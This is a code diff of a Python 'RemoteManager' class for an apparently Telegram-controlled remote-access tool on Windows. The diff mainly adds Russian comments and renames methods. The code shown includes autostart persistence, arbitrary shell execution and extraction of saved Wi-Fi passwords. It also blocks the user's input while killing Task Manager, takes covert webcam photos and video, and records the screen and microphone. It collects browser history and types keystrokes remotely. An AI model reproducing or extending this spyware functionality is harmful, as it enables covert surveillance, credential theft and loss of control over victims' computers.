@@ -6,8 +6,6 @@ import subprocess
 import threading
 import time
 import wave
-from datetime import datetime
-
 import cv2
 import keyboard
 import numpy as np
@@ -16,7 +14,6 @@ import pyaudio
 import pyautogui
 import pyttsx3
 import webbrowser
-
 import win32con
 import win32gui
 
@@ -26,13 +23,13 @@ from browser_history.browsers import OperaGX, Edge, Firefox, Brave, Chromium, Op
 
 
 class RemoteManager:
-    browsers = [OperaGX, Edge, Firefox, Brave, Chromium, Opera, Safari, Chrome]
 
     def __init__(self, bot):
         self.bot = bot
         self.USER_NAME = getpass.getuser()
         self.width, self.height = pyautogui.size()
 
+    # добавляет .bat файл в автозагрузку
     def add_to_startup(self, file_path=""):
         if file_path == "":
             file_path = os.path.dirname(os.path.realpath(__file__))
@@ -54,6 +51,7 @@ class RemoteManager:
 
         return result if not result.isspace() else "Неизвестная комманда"
 
+    # выполняет введеную консольную команду
     def execute_command_console(self, command):
         child = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
         my_out = io.TextIOWrapper(child.stdout, encoding='cp866')
@@ -66,9 +64,11 @@ class RemoteManager:
 
         return res
 
+    # открывает указанную веб-страницу
     def open_url(self, url="https://www.youtube.com/watch?v=dQw4w9WgXcQ"):
         webbrowser.open(url, new=1)
 
+    # выводит имена беспроводных сетей Wi-fi и пароли от них соответственно
     def get_passwords(self):
         wifi_list = self.execute_command_console("netsh wlan show profiles")
 
@@ -99,21 +99,23 @@ class RemoteManager:
 
         return res
 
+    # смена текущей директории на указанную пользователем
     def change_directory(self, path):
         try:
             os.chdir(path)
-            return f"[+] Changing directory to {self.execute_command_console('cd')}"
+            return f"[+] Смена директории на {self.execute_command_console('cd')}"
         except FileNotFoundError:
-            return "Cannot find this path/file/dir"
+            return "Данный path/file/dir не найден"
         except OSError:
-            return "Syntax error in name of path/file/dir"
+            return "Синтаксическая ошибка в имени path/file/dir"
 
+    # озвучивает текст, введеный пользователем
     async def say_text(self, text):
         engine = pyttsx3.init()
         engine.say(text)
         engine.runAndWait()
 
-    def blockinput(self):
+    def block_input(self):
         if not self.block_input_flag:
             self.block_input_flag = True
             t1 = threading.Thread(target=self.blockinput_start)
@@ -125,7 +127,8 @@ class RemoteManager:
 
         return result
 
-    def blockinput_stop(self):
+    # разрешает пользователю использовать устройства ввода
+    def block_input_stop(self):
         if self.block_input_flag:
             for i in range(150):
                 keyboard.unblock_key(i)
@@ -137,7 +140,8 @@ class RemoteManager:
 
         return result
 
-    def blockinput_start(self):
+    # запрещает пользователю использовать устройства ввода. (а эта функция нужна? ты же используешь blockinput)
+    def block_input_start(self):
         mouse = Controller()
         for i in range(150):
             keyboard.block_key(i)
@@ -147,6 +151,7 @@ class RemoteManager:
                 if proc.name().lower() == 'taskmgr.exe':
                     proc.terminate()
 
+    # фото с веб-камеры
     def make_cam_photo(self):
         cap = cv2.VideoCapture(0)
 
@@ -164,6 +169,7 @@ class RemoteManager:
 
         return True
 
+    # запись видео веб-камеры без звука
     def make_cam_video(self, time):
         # умножать на кол-во кадров в секунду
         time_converted = time * 20
@@ -196,6 +202,7 @@ class RemoteManager:
 
         return types.InputFile(path_or_bytesio='webvideo.avi')
 
+    # запись видео рабочего стола без звука
     def make_desktop_video(self, duration):
         # умножать на кол-во кадров в секунду
         time_converted = duration * 20
@@ -219,6 +226,7 @@ class RemoteManager:
 
         return types.InputFile(path_or_bytesio='deskvideo.avi')
 
+    # запись звука микрофона
     def make_audiofile_from_micro(self, time):
         FORMAT = pyaudio.paInt16
         CHANNELS = 2
@@ -228,7 +236,7 @@ class RemoteManager:
 
         audio = pyaudio.PyAudio()
 
-        # start Recording
+        # старт записи
         stream = audio.open(format=FORMAT, channels=CHANNELS,
                             rate=RATE, input=True,
                             frames_per_buffer=CHUNK)
@@ -252,6 +260,9 @@ class RemoteManager:
 
         return types.InputFile(path_or_bytesio='file.wav')
 
+    browsers = [OperaGX, Edge, Firefox, Brave, Chromium, Opera, Safari, Chrome]
+
+    # выводит историю каждого браузера, находящегося в массиве 'browsers'
     def get_history(self, date):
         all_history = f'История браузеров на {date}, вы можете указать дату в формате команды \n' \
                       f'/history 2022-08-10 \n'
@@ -279,18 +290,32 @@ class RemoteManager:
 
         return all_history
 
+    # меняет фон рабочего стола
     def change_background(self, path='C:\\Users\\Dima\\PycharmProjects\\tgbot'):
         SPI_SETDESKWALLPAPER = 20
         ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 3)
 
+    # вводит ПК в спящий режим
     def turn_off_screen(self):
         win32gui.SendMessage(win32con.HWND_BROADCAST,
                              win32con.WM_SYSCOMMAND, win32con.SC_MONITORPOWER, 2)
 
+    # выводит ПК из спящего режима
     def turn_on_screen(self):
         pyautogui.click()
 
-    def check_keyboard_inputes(self, duration, text_of_message):
+    # печатает указанный пользователем текст в течение указанного пользователем времени
+    def typing_keyboard_remotely(self, duration, text_of_message):
         start_time = time.perf_counter()
         while time.perf_counter() - start_time <= duration:
             keyboard.write(f"{text_of_message}\n", delay=0.1)
+
+    # включает музыку(плейлист cringe <3) с задержкой в 4 секунды
+    def play_music(self):
+        # мой плейлист с: фармим прослушивания
+        webbrowser.open('https://vk.com/audios254899850?section=all&z=audio_playlist254899850_135')
+        # чтобы страничка успела прогрузиться
+        time.sleep(4)
+        # курсор наводится на кнопку "перемешать всё"
+        pyautogui.moveTo(self.width / 2, self.height / 4 + 25)
+        pyautogui.click()
